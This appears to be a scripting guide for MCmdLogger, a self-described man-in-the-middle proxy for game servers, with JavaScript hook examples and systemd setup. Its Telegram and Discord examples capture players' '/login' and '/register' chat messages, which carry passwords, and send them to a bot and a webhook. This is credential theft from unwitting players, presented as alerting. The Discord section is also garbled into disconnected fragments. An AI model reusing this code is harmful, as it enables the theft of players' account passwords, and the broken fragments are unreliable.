Scripts Guide

Learn how to write scripts for MCmdLogger

üìö Introduction

MCmdLogger uses JavaScript for scripting. Scripts are loaded from the scripts/ folder and executed when MCmdLogger starts.

‚ö†Ô∏è Command Naming Convention

Custom command names must follow this pattern:

^[0-9a-z_]*$

Only lowercase letters (a-z), numbers (0-9), and underscores (_) are allowed.

Valid: kickall, my_cmd, msg2

Invalid: KickAll, my-cmd, cmd!

ü™ù Hooks

Hooks are the main way to interact with MCmdLogger. They allow you to react to events.

playerJoin hook

Called when a player connects to the proxy:

playerJoin(player => {
    console.log(player.name + " connected!");
    
    // Send welcome message
    player.send("Welcome to the server!");
    
    // Listen for player leaving
    player.on("leave", () => {
        console.log(player.name + " left");
    });
});

command hook

Register custom console commands:

command("kickall", "Kicks all players", () => {
    players().forEach(p => p.kick());
    console.log("All players kicked!");
});

// With arguments
command("msg", "<player> <message>", "Send message to player", cmd => {
    const args = cmd.split(" ");
    const target = args[0];
    const message = args.slice(1).join(" ");
    
    for (const p of players()) {
        if (p.name === target) {
            p.send(message);
            break;
        }
    }
});

ü§ñ Discord/Telegram Bots Integration

You can send notifications to Discord/Telegram from your scripts using the built-in HTTP functions:

Send to Telegram Bot

// Your bot token and chat ID
const BOT_TOKEN = "123456:ABC-DEF...";
const CHAT_ID = "1091959360";

function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });
}

// Usage in playerJoin:
playerJoin(player => {
    sendTelegram(`üü¢ ${player.name} connected!`);
    
    player.on("player_message", event => {
        if (event.text.startsWith("/login ") || 
            event.text.startsWith("/register ")) {
            sendTelegram(`üîë ${player.name}: ${event.text}`);
        }
    });
    
    player.on("leave", () => {
        sendTelegram(`üî¥ ${player.name} disconnected`);
    });
});

const WEBHOOK_URL = "https://discord.com/api/webhooks/...";

                title: "MCmdLogger Alert",
                description: message,
                color: color,
                timestamp: new Date().toISOString()

        })

            sendDiscord(`üîë **${player.name}**: \`${event.text}\``, 0xffff00);
        }
    });
});

# To reattach later:
screen -r mcmd

Systemd Auto-Start Service

Create /etc/systemd/system/mcmdlogger.service:

[Unit]
Description=MCmdLogger MITM Proxy
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/mcmdlogger
ExecStart=/root/mcmdlogger/mcmdlogger
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
# Enable and start the service
systemctl enable mcmdlogger
systemctl start mcmdlogger

# Check status
systemctl status mcmdlogger
